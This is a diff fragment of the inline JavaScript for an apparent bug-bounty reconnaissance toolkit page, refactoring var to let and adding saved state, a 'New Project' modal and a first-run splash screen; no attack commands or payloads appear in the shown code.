                 document.body.appendChild(ta);
                 ta.select();
@@ -6908,9 +7745,9 @@ echo "=== Recon Summary ==="
           });
         });
 
-        //  Toast ─
+        // Toast
         function showToast(msg) {
-          var t = document.getElementById('toast');
+          let t = document.getElementById('toast');
           t.textContent = '✓ ' + msg;
           t.classList.add('show');
           setTimeout(function () {
@@ -6918,7 +7755,7 @@ echo "=== Recon Summary ==="
           }, 2500);
         }
 
-        //  Target input
+        // Target input
         document
           .getElementById('targetInput')
           .addEventListener('input', function () {
@@ -6928,10 +7765,11 @@ echo "=== Recon Summary ==="
             document.getElementById('twarn').style.display = this.value
               ? 'none'
               : 'block';
+            saveState({ target: this.value });
           });
 
         //  File generator
-        var files = [
+        let files = [
           {
             name: '00_setup_workspace.sh',
             desc: 'Create all output directories and placeholder files',
@@ -6979,8 +7817,8 @@ echo "=== Recon Summary ==="
         ];
 
         function getFileContent(name) {
-          var t = target;
-          var contents = {
+          let t = target;
+          let contents = {
             '00_setup_workspace.sh':
               '#!/bin/bash\n' +
               'TARGET="' +
@@ -7189,7 +8027,7 @@ echo "=== Recon Summary ==="
         }
 
         function buildFileList() {
-          var list = document.getElementById('fileList');
+          let list = document.getElementById('fileList');
           list.innerHTML = files
             .map(function (f, i) {
               return (
@@ -7214,11 +8052,11 @@ echo "=== Recon Summary ==="
         }
 
         function downloadFile(i) {
-          var f = files[i];
-          var content = getFileContent(f.name);
-          var blob = new Blob([content], { type: 'text/plain' });
-          var url = URL.createObjectURL(blob);
-          var a = document.createElement('a');
+          let f = files[i];
+          let content = getFileContent(f.name);
+          let blob = new Blob([content], { type: 'text/plain' });
+          let url = URL.createObjectURL(blob);
+          let a = document.createElement('a');
           a.href = url;
           a.download = f.name;
           document.body.appendChild(a);
@@ -7231,7 +8069,7 @@ echo "=== Recon Summary ==="
         document
           .getElementById('genAllBtn')
           .addEventListener('click', function () {
-            var t = document.getElementById('targetInput').value;
+            let t = document.getElementById('targetInput').value;
             if (!t) {
               document.getElementById('twarn').style.display = 'block';
               return;
@@ -7245,15 +8083,15 @@ echo "=== Recon Summary ==="
           });
 
         //  PortSwigger search
-        var psSearchInput = document.getElementById('psSearch');
+        let psSearchInput = document.getElementById('psSearch');
         if (psSearchInput) {
           psSearchInput.addEventListener('input', function () {
-            var q = this.value.toLowerCase().trim();
+            let q = this.value.toLowerCase().trim();
             document.querySelectorAll('.ps-sec').forEach(function (sec) {
               if (!q) {
                 sec.style.display = '';
               } else {
-                var text = sec.textContent.toLowerCase();
+                let text = sec.textContent.toLowerCase();
                 sec.style.display = text.includes(q) ? '' : 'none';
               }
             });
@@ -7264,15 +8102,136 @@ echo "=== Recon Summary ==="
         buildFileList();
         updateProgress();
 
-        // Open first section in each phase by default
-        document.querySelectorAll('.sh.open').forEach(function (h) {
-          var body = h.nextElementSibling;
-          if (body) {
-            body.classList.add('open');
+        if (!state.openSections) {
+          document.querySelectorAll('.sh.open').forEach(function (h) {
+            let idx = h.getAttribute('data-sh-idx');
+            let body = h.nextElementSibling;
+            if (body) body.classList.add('open');
+            let tog = h.querySelector('.stg');
+            if (tog) tog.classList.add('open');
+            openSections.add(idx);
+          });
+          saveState({ openSections: Array.from(openSections) });
+        }
+
+        // New Project
+        function openNewProjectModal() {
+          let modal = document.getElementById('newProjectModal');
+          modal.style.display = 'flex';
+          document.getElementById('modalTarget').value = '';
+          document.getElementById('modalPlatform').value = '';
+          document.getElementById('modalSeverity').value = '';
+          document.getElementById('modalNotes').value = '';
+          document.getElementById('modalError').style.display = 'none';
+          setTimeout(function () {
+            document.getElementById('modalTarget').focus();
+          }, 50);
+        }
+
+        function closeNewProjectModal() {
+          document.getElementById('newProjectModal').style.display = 'none';
+        }
+
+        function createProject() {
+          let target = document.getElementById('modalTarget').value.trim();
+          let errEl = document.getElementById('modalError');
+          if (!target) {
+            errEl.textContent = 'Please enter a target domain.';
+            errEl.style.display = 'block';
+            document.getElementById('modalTarget').focus();
+            return;
           }
-          var tog = h.querySelector('.stg');
-          if (tog) tog.classList.add('open');
-        });
+          // Check duplicate
+          let projects = JSON.parse(localStorage.getItem(LS_PROJECTS) || '[]');
+          let dup = projects.find(function (p) {
+            return p.target.trim().toLowerCase() === target.toLowerCase();
+          });
+          if (dup) {
+            errEl.textContent =
+              'A project for "' + target + '" already exists.';
+            errEl.style.display = 'block';
+            return;
+          }
+          // Save current session before switching
+          let currentState = loadState();
+          let currentTarget = (currentState.target || '').trim();
+          if (
+            currentTarget &&
+            currentTarget.toLowerCase() !== target.toLowerCase()
+          ) {
+            let existingIdx = projects.findIndex(function (p) {
+              return (
+                p.target.trim().toLowerCase() === currentTarget.toLowerCase()
+              );
+            });
+            if (existingIdx >= 0) {
+              projects[existingIdx].state = currentState;
+              projects[existingIdx].checkedCount = (
+                currentState.checked || []
+              ).length;
+              projects[existingIdx].savedAt = new Date().toISOString();
+            }
+          }
+          let platform = document.getElementById('modalPlatform').value;
+          let severity = document.getElementById('modalSeverity').value;
+          let notes = document.getElementById('modalNotes').value.trim();
+          projects.unshift({
+            target: target,
+            platform: platform,
+            severity: severity,
+            bounty: 0,
+            notes: notes,
+            savedAt: new Date().toISOString(),
+            checkedCount: 0,
+            totalCount: document.querySelectorAll('.cbox').length || 203,
+            state: { target: target },
+          });
+          localStorage.setItem(
+            LS_PROJECTS,
+            JSON.stringify(projects.slice(0, MAX_PROJECTS)),
+          );
+          // Load new project state into toolkit
+          localStorage.setItem(LS_KEY, JSON.stringify({ target: target }));
+          closeNewProjectModal();
+          location.reload();
+        }
+
+        document
+          .getElementById('newProjectBtn')
+          .addEventListener('click', openNewProjectModal);
+        document
+          .getElementById('splashCreateBtn')
+          .addEventListener('click', openNewProjectModal);
+        document
+          .getElementById('modalCloseBtn')
+          .addEventListener('click', closeNewProjectModal);
+        document
+          .getElementById('modalCancelBtn')
+          .addEventListener('click', closeNewProjectModal);
+        document
+          .getElementById('modalCreateBtn')
+          .addEventListener('click', createProject);
+        document
+          .getElementById('newProjectModal')
+          .addEventListener('click', function (e) {
+            if (e.target === this) closeNewProjectModal();
+          });
+        document
+          .getElementById('modalTarget')
+          .addEventListener('keydown', function (e) {
+            if (e.key === 'Enter') createProject();
+          });
+
+        // Splash screen: show if no projects exist
+        (function checkFirstRun() {
+          let projects = JSON.parse(localStorage.getItem(LS_PROJECTS) || '[]');
+          let currentTarget = (loadState().target || '').trim();
+          // Show splash if no projects AND no active session target
+          if (projects.length === 0 && !currentTarget) {
+            let splash = document.getElementById('noProjectScreen');
+            splash.style.display = 'flex';
+          }
+        })();
       })();
     </script>
   </body>
